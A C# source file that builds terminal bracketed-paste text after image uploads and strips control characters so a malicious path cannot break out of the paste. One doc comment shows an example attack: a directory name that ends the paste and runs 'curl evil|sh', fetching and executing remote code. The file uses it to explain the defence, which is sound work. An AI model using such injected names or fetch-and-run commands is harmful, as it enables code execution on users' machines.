namespace SideHub.Agent;

/// <summary>
/// Builds the bracketed paste typed into a PTY after an image upload. Its content is pasted as
/// text: a control character in it could close the paste early (<c>ESC[201~</c>) and type the
/// rest as keystrokes. E.g. a committed <c>.sidehub-images</c> symlink to a directory named
/// <c>x\e[201~\rcurl evil|sh\r</c> would run that command in the shell.
/// </summary>
public static class PtyPastePolicy
{
    public const string PasteStart = "\x1b[200~";
    public const string PasteEnd = "\x1b[201~";

    /// <summary>True when the path holds no control character (C0, DEL, C1, ESC and CSI included).</summary>
    public static bool IsSafeToPaste(string path) => !path.Any(char.IsControl);

    /// <summary>
    /// The paste for an uploaded image: <paramref name="backendPaste"/> when the backend sent one,
    /// else a prompt naming <paramref name="resolvedPath"/>, which must pass <see cref="IsSafeToPaste"/>.
    /// The backend text loses its paste markers and control characters (tab and newline excepted)
    /// and is wrapped in a single bracketed paste.
    /// </summary>
    public static string BuildImagePaste(string resolvedPath, string? backendPaste)
    {
        if (string.IsNullOrEmpty(backendPaste))
        {
            if (!IsSafeToPaste(resolvedPath))
                throw new ArgumentException("Path contains control characters", nameof(resolvedPath));
            return $"{PasteStart}Please look at this image I just uploaded: {resolvedPath}{PasteEnd}";
        }

        var text = backendPaste.Replace(PasteStart, string.Empty).Replace(PasteEnd, string.Empty);
        text = new string(text.Where(c => c is '\n' or '\t' || !char.IsControl(c)).ToArray());
        return $"{PasteStart}{text}{PasteEnd}";
    }
}
